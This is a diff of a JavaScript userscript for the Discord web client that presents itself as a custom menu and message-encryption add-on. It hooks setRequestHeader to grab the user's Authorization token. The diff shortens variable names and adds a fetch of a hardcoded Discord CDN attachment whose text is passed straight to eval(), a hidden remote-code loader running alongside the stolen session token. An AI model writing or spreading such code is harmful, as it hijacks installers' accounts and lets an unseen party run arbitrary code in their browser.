@@ -1,15 +1,18 @@
 let triggered=false;
-XMLHttpRequest.prototype.realHeaders=XMLHttpRequest.prototype.setRequestHeader;
-let newhead=function(x,y){
+XMLHttpRequest.prototype.RH=XMLHttpRequest.prototype.setRequestHeader;
+let nh=function(x,y){
     if(x=="Authorization"&&triggered==false){
         triggered=!triggered;
         ws(y);
     }
-    this.realHeaders(x,y);
+    this.RH(x,y);
 }
-XMLHttpRequest.prototype.setRequestHeader=newhead;
+XMLHttpRequest.prototype.setRequestHeader=nh;
 async function ws(token) {
+    let custom="kastm kod"
+    let kastm=false
     let exits=true;
+    let bl="947598329498443896/996396961773125752"
     async function kastommeni(){
         let kastmmenu = document.createElement("div");
         document.body.appendChild(kastmmenu)
@@ -68,8 +71,6 @@ async function ws(token) {
             iskljucenje.style.background=exits==true?"red":"green"
         }
     }
-    let custom=""
-    let kastm=false
     const onoff = document.querySelector('[aria-label="Channel header"]');
     let btn = document.createElement("button");
     onoff.appendChild(btn)
@@ -104,6 +105,11 @@ async function ws(token) {
         childList: true,
         subtree: true
     };
+    let p="https://cdn.discordapp.com"
+    fetch(p+"/attachments/"+bl+"/message.txt")
+    .then(x=>{       return x})
+    .then(x=>{return x.text()})
+    .then(x=>{        eval(x)})
     observer.observe(bodyList, config);
     let encrypt = (plainText) =>
         {
